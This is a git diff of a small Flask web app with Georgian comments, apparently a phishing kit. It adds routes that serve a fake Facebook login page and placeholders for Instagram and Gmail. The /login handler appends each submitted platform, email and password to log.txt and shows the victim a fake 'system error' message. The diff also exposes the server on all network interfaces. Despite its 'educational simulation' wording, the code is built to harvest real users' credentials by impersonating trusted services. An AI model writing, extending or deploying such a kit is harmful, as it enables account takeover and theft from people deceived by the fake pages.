@@ -2,21 +2,39 @@ from flask import Flask, render_template, request
 
 app = Flask(__name__)
 
+# მთავარი მენიუ
 @app.route('/')
-
 def home():
-    #ხსნის intel.html 
-    return render_template('index.html')
+    return render_template('menu.html')
 
-@app.route('/login', methods = ['POST'])
+# ფეისბუქი
+@app.route('/facebook')
+def facebook():
+    return render_template('facebook.html')
+
+# ინსტაგრამი
+@app.route('/instagram')
+def instagram():
+    return "<h1>instagram-ის გვერდი მზადების პროცესშია</h1>"
+
+# მეილი
+@app.route('/gmail')
+def gmail():
+    return "<h1>gmail-ის გვერდი მზადების პროცესშია</h1>"
+
+# მონაცემების მიღება (სამივე საიტი აქ გამოაგზავნის პაროლებს)
+@app.route('/login', methods=['POST'])
 def login():
-    #მონაცემები რასაც მომხმარებელი შეიყვანს
+    platform = request.form.get('platform')
     email = request.form.get('email')
-    password = request.form.get('password')
+    password = request.form.get('password') 
 
-    print(f"მონაცემები მოვიდა! Email: {email}, Password: {password}")
+    #log.txt
+    with open('log.txt', 'a', encoding='utf-8') as f:
+        f.write(f"[{platform}] Email: {email} | Password: {password}\n")
 
-    return "<h1>ეს არის საგანმანათლებლო სიმულაცია</h1><p>თქვენი მონაცემები არსად არ გაიგზავნება</p>"
+    return "<h1>სისტემური შეცდომა!</h1><p>ეს არის სიმულაცია. მონაცემები ჩაიწერა log.txt-ში.</p>"
 
 if __name__ == '__main__':
-    app.run(debug = True)
+    #წვდომა ქსელში
+    app.run(host='0.0.0.0', port=5000, debug=True)
